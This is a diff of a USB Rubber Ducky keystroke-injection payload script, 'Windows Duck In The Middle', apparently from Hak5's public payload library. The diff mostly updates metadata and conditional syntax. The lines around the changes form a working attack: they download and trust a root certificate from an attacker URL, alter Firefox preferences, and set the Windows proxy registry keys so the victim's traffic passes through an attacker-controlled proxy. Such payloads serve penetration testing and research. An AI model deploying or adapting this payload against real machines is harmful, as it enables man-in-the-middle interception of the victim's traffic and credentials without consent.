@@ -1,10 +1,10 @@
-REM_BLOCK INFOS
+REM_BLOCK DOCUMENTATION
     Title: Windows Duck In The Middle
-    Version: 1.0
-    Author: Who-Is-Julien
+    Version: 1.1
+    Author: PudgyTurkey
     Description: This payload configures the target PC user to redirect network traffic via a proxy, enabling a Man-in-the-middle attack.
     Target: Windows 10, 11
-    Documentation: https://github.com/hak5/usbrubberducky-payloads/blob/master/payloads/library/execution/Windows-Duck-In-The-Middle/README.md
+    Github: https://github.com/hak5/usbrubberducky-payloads/tree/master/payloads/library/execution/Windows-Duck-In-The-Middle
 END_REM
 
 REM Required options:
@@ -95,7 +95,7 @@ STRING_POWERSHELL
         Invoke-WebRequest -UseBasicParsing -Uri "#CERT_URL" -OutFile $c; 
         Import-Certificate -FilePath $c -CertStoreLocation "Cert:\CurrentUser\Root"; 
 END_STRING
-IF ( #CONFIGURE_FIREFOX == TRUE ) THEN
+IF_DEFINED_TRUE #CONFIGURE_FIREFOX
     STRING_POWERSHELL
             if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles") { 
                 Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "prefs.js" -Recurse | ForEach-Object { 
@@ -103,7 +103,7 @@ IF ( #CONFIGURE_FIREFOX == TRUE ) THEN
                 } 
             }; 
     END_STRING
-END_IF
+END_IF_DEFINED
 STRING_POWERSHELL
         @{ "ProxyServer" = "#PROXY_IP:#PROXY_PORT"; "ProxyEnable" = "1" }.GetEnumerator() | ForEach-Object { 
             Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name $_.Name -Value $_.Value 
@@ -122,6 +122,6 @@ DELAY #SHORT_DELAY
 TAB
 ENTER
 CTRL GUI F4
-IF ( #DISABLE_AFTER_EXECUTION == TRUE ) THEN
+IF_DEFINED_TRUE #DISABLE_AFTER_EXECUTION
     ATTACKMODE OFF
-END_IF
+END_IF_DEFINED
